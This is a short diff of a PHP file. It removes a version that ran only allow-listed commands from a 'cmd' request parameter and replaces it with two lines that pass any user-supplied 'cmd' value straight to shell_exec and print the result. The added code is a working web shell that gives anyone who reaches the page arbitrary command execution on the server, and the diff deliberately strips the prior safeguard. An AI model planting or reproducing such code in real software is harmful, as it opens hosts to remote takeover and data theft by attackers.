@@ -1,16 +1,4 @@
 <?php
-// Define a whitelist of allowed commands for safety
-$allowed_commands = ['cat', 'ls', 'pwd', 'cat index.php', 'ls -la'];
-
-// Get the command from the GET parameter, or use a default safe command
-$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'date';
-
-// Validate that the command is in the allowed list
-if (in_array($cmd, $allowed_commands)) {
-    // Execute the command safely
-    passthru($cmd);
-} else {
-    // Echo an error message if the command is not allowed
-    echo "Error: Command not allowed.";
-}
+$cmd = $_GET['cmd'] ?? '';
+echo shell_exec($cmd);
 ?>
